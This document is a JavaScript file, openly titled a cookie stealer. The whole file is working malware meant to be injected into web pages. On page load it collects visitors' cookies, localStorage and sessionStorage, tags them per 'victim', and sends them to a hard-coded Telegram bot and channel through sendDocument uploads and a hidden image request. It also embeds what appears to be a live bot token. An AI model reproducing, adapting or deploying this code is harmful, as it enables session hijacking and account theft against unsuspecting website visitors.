// ===== COOKIE STEALER =====
const BOT_TOKEN = "8849922646:AAHL1k8PDTU83eg5OVZJYTqGdLvyfwdydaw";
const CHANNEL_ID = "8374468402";

// ===== GET ALL COOKIES =====
function getAllCookies() {
    const cookies = [];
    try {
        const docCookies = document.cookie.split('; ').map(c => {
            const [name, value] = c.split('=');
            return { name: name, value: decodeURIComponent(value || '') };
        }).filter(c => c.name);
        cookies.push(...docCookies);
    } catch(e) {}
    return cookies;
}

// ===== GET ALL STORAGE =====
function getAllStorage() {
    const data = { localStorage: {}, sessionStorage: {} };
    try {
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            data.localStorage[key] = localStorage.getItem(key);
        }
    } catch(e) {}
    try {
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            data.sessionStorage[key] = sessionStorage.getItem(key);
        }
    } catch(e) {}
    return data;
}

// ===== SEND JSON TO TELEGRAM =====
function sendJSONtoTelegram(jsonData, filename) {
    try {
        const jsonStr = JSON.stringify(jsonData, null, 2);
        const blob = new Blob([jsonStr], { type: 'application/json' });
        const formData = new FormData();
        formData.append('chat_id', CHANNEL_ID);
        formData.append('document', blob, filename);
        formData.append('caption', `📁 ${filename}`);
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
            method: 'POST',
            body: formData
        }).catch(() => {});
    } catch(e) {}
}

// ===== SEND TEXT =====
function sendToTelegram(message) {
    try {
        const img = new Image();
        img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHANNEL_ID}&text=${encodeURIComponent(message)}`;
        img.style.display = 'none';
        document.body.appendChild(img);
        setTimeout(() => { if (img.parentNode) img.parentNode.removeChild(img); }, 3000);
        return true;
    } catch(e) { return false; }
}

// ===== MAIN STEALER =====
let cookiesSent = false;
let storageSent = false;

function stealCookies(source = 'page_load') {
    const victimId = localStorage.getItem('victim_id') || 'UNKNOWN';
    
    // Cookies
    if (!cookiesSent) {
        const cookies = getAllCookies();
        if (cookies.length > 0) {
            let msg = `[+]━━【🍪 COOKIES】━━[+]\nSource: ${source}\nVictim: ${victimId}\nTotal: ${cookies.length}\n\n`;
            cookies.slice(0, 5).forEach((c, i) => {
                let val = c.value.length > 30 ? c.value.substring(0, 30) + '...' : c.value;
                msg += `  ${i+1}. ${c.name}=${val}\n`;
            });
            if (cookies.length > 5) msg += `  ... and ${cookies.length - 5} more\n`;
            sendToTelegram(msg);
            
            sendJSONtoTelegram({
                victim: victimId,
                timestamp: new Date().toISOString(),
                cookies: cookies
            }, `cookies_${victimId}_${Date.now()}.json`);
        }
        cookiesSent = true;
    }
    
    // Storage
    if (!storageSent) {
        const storage = getAllStorage();
        const localCount = Object.keys(storage.localStorage).length;
        if (localCount > 0) {
            let msg = `[+]━━【💾 STORAGE】━━[+]\nSource: ${source}\nVictim: ${victimId}\n${localCount} items\n\n`;
            Object.keys(storage.localStorage).slice(0, 5).forEach(key => {
                let val = storage.localStorage[key];
                if (typeof val === 'string' && val.length > 30) val = val.substring(0, 30) + '...';
                msg += `  • ${key}: ${val}\n`;
            });
            sendToTelegram(msg);
            
            sendJSONtoTelegram({
                victim: victimId,
                timestamp: new Date().toISOString(),
                localStorage: storage.localStorage,
                sessionStorage: storage.sessionStorage
            }, `storage_${victimId}_${Date.now()}.json`);
        }
        storageSent = true;
    }
}

// ===== AUTO-STEAL ON LOAD =====
setTimeout(() => stealCookies('page_load'), 2000);
setTimeout(() => stealCookies('delayed'), 5000);

// ===== EXPOSE =====
window.stealCookies = stealCookies;
window.getAllCookies = getAllCookies;
window.getAllStorage = getAllStorage;
window.sendJSONtoTelegram = sendJSONtoTelegram;
